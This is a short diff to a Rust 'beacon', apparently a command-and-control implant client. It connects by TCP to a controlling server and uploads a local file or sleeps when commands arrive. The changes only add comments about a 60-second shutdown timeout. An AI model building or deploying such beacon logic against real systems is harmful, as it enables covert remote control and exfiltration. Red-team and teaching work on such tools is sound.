@@ -33,6 +33,8 @@ fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
     }
 }
 
+
+/// after X times the beacon will be destroyed by being shutdown
 fn duration_before_shutdown(stream: &mut TcpStream, time:u64) {
     stream.set_read_timeout(Some(Duration::new(TIMEOUT, 0))).expect("set_read_timeout call failed");
 }
@@ -106,7 +108,8 @@ fn main(){
     let mut stream = TcpStream::connect(addr).unwrap(); // connect to server
     println!("Server connecting on addr {}",addr);
 
-    duration_before_shutdown(&mut stream, 60);
+    
+    duration_before_shutdown(&mut stream, 60); //beacon will be shutdown after 60 sec if it doesn't receive informations
 
     let mut reader = BufReader::new(&stream); // struct adds buffering to any reader.
     let mut writer = &stream;
@@ -119,7 +122,7 @@ fn main(){
         let mut stream2 = stream.try_clone().unwrap();
 
         if line.contains("upload"){
-            upload_file(&mut stream2, "src/uploadFile.txt");
+            upload_file(&mut stream2, "src/uploadFile.txt"); //
         }
         if line.contains("sleep"){
             println!("exectue sleep function");
